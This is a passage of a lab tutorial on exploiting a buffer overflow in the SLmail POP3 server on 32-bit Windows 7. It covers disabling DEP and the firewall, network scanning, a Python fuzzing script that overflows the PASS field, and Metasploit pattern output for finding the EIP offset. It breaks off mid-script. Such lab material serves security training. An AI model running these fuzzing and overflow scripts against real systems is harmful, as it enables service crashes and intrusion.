**Buffer overflow** is a common vulnerability in software that can allow an attacker to execute malicious code or take control of a compromised system.

This vulnerability occurs when a program attempts to store more data in a buffer (temporary memory area for data storage) than was intended, and as the buffer capacity is exceeded, the additional data is written to other adjacent memory areas.

This can allow an attacker to write malicious code into these memory areas and overwrite other critical system data, such as the return address of a function or the memory address where a variable is stored, allowing the attacker to take control of the program flow.

The impacts of a buffer overflow can be severe, as an attacker can exploit this vulnerability to obtain confidential information, steal data or even take complete control of the system. If the attackers have the necessary knowledge, they can even manage to execute malicious commands on the compromised system.

# Example

## Setup

For the realization of this laboratory we are going to install [the following version](https://windows-7-home-premium.uptodown.com/windows/descargar/68635486) of *Windows 7 of 32 bits*.

After the installation we configure the *network* as *home network* and when we finish we turn off the system.

Now for the installation of the *vmware-tools* we must enter the machine settings and *remove* both the *floppy* and the *CD/DVD*. Then we *must* add another *CD/DVD* and we will be able to boot the machine again.

Once we are on the desktop we right click on the machine and install the *vmware-tools*.

Now we will download **immunity debugger** from [the following website](https://immunityinc.com/products/debugger/) and proceed to install it.

We must disable the *DEP* to let us run certain commands in the stack and not give us conflict. For it we will have to open a cmd as administrator and execute the following command:

```
bcdedit.exe /set {current} nx AlwaysOff
```

We will download the **mona** script from [the following GitHub repository](https://raw.githubusercontent.com/corelan/mona/master/mona.py) and move it to *C://Program Files/Immunity Inc/Immunity Debugger/PyCommands*. Afterwards, we will restart the computer again for the *DEP* changes to be applied.

We are going to download the application that we are going to be exploiting, **slmail**, from [the following link](https://slmail.software.informer.com/download/) and we are going to proceed to its installation, for it we are going to always click next.

Finally we are going to *disable* the *Windows 7 firewall* to be able to recognize the ports from the attacking machine and we are going to reboot the system once again.

Now from the attacking machine we can check the *IP* of the *victim* machine (in this case it will be *192.168.50.167*) with **arp-scan** and check its availability with **ping**:

```bash
arp-scan -I ens33 --localnet --ignoredups

ping -c 1 192.168.50.167
```

After this we can run a scan with **nmap** to check that slmail port *110* is open:

```bash
nmap -sS --min-rate 5000 --open -vvv -n -Pn -p- 192.168.50.167
```

## Initial phase of Fuzzing and taking control of the EIP record

In the initial phase of exploiting a buffer overflow, one of the first tasks is to find out the limits of the target program. This is done by trying to enter more characters than necessary in different input fields of the program, such as a text string or a file, until it is detected that the application is corrupted or fails.

Once the input field limit is found, the next step is to find out the *offset*, which corresponds to the exact number of characters that must be entered to cause a corruption in the program and, therefore, to overwrite the value of the EIP register.

The *EIP* (*Extended Instruction Pointer*) register is a CPU register that points to the memory address where the next instruction to be executed is located. In a successful buffer overflow, the value of the *EIP* register is *overwritten with an address controlled by the attacker*, allowing malicious code to be executed instead of the original program code.

Therefore, the goal of finding out the offset is to determine the exact number of characters that must be entered in the input field to overwrite the EIP register value and point to the attacker-controlled memory address. Once the offset is known, the attacker can design a custom exploit for the target program to take control of the EIP register and execute malicious code.

----

On the victim machine, we must first make sure we have **slmail** running and then open **immunity debugger**, click *File > Attach* and attach the *SLmail* process. Then press *play*.

Now we will create a *Python* script *exploit.py* that will *socket* a string of '*A*' of the size we specify to the "*PASS*" field of **slmail** (we know that this field is vulnerable thanks to **searchsploit**):

```python
#!/usr/bin/python3

import socket
import sys

if len(sys.argv) != 2:
    print("\n[!] Usage: exploit.py <length>")
    exit(1)

# Global variables
ip_address = "192.168.50.167"
port = 110
total_length = int(sys.argv[1])

def exploit():
    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    s.connect((ip_address, port))

    # Receive the banner
    banner = s.recv(1024)

    s.send(b"USER loki" + b'\r\n')
    response = s.recv(1024)

    # We will send the 'A' char X times to parameter PASS
    # \r\n reflects that we have hit enter, otherwise it will not send this data
    s.send(b"PASS " + b"A"*total_length + b'\r\n')
    s.close()

if __name__ == '__main__':
    exploit()
```

Now we are going to test how many '*A*' we can send until the app crashes and the **immunity debugger** returns the log:

```bash
# For example, we start with 200 chars ...
python3 exploit.py 200

python3 exploit.py 500

python3 exploit.py 1000

python3 exploit.py 5000
```

At *5000* characters we see that the application has crashed and the *EIP* shows *41414141* (*AAAA*).

Now we need to find out exactly how many bytes we have to send for the app to crash. For this we are going to use the *pattern_create* and *pattern_offset* utilities of **metasploit**.

With *pattern_create* we are going to generate *5000* random bytes:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000

# Output
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk
```

We copy this output and pass it in the script instead of the '*A*', in order to see what hexadecimal string we get in the *EIP* and then we pass it to the *pattern_offset*:

```python
#!/usr/bin/python3

import socket

# Global variables
ip_address = "192.168.50.167"
port = 110

payload = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk"

def exploit():
    # Create a socket
